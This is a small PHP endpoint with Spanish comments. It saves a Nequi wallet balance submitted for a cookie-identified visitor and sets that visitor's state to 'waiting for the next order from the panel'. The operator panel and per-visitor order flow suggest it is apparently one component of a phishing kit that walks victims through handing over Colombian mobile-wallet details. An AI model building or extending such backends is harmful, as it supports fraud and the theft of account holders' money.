<?php
/**
 * Guarda saldo disponible y vuelve a estado 1 (esperando siguiente orden)
 */
require_once('../lib/class.inputfilter.php');
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');

$ifilter = new InputFilter();
$id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';
$saldo = isset($_POST['saldo']) ? $ifilter->process($_POST['saldo']) : '';

if ($id === '' || $id === '0' || $saldo === '') {
	http_response_code(400);
	echo 'ERR';
	exit;
}

put_saldo_nequi($id, $saldo);

// ✅ AGREGAR: Cambiar estado a 1 (esperando siguiente orden del panel)
cambiar_estado($id, 1);

echo 'OK';
?>
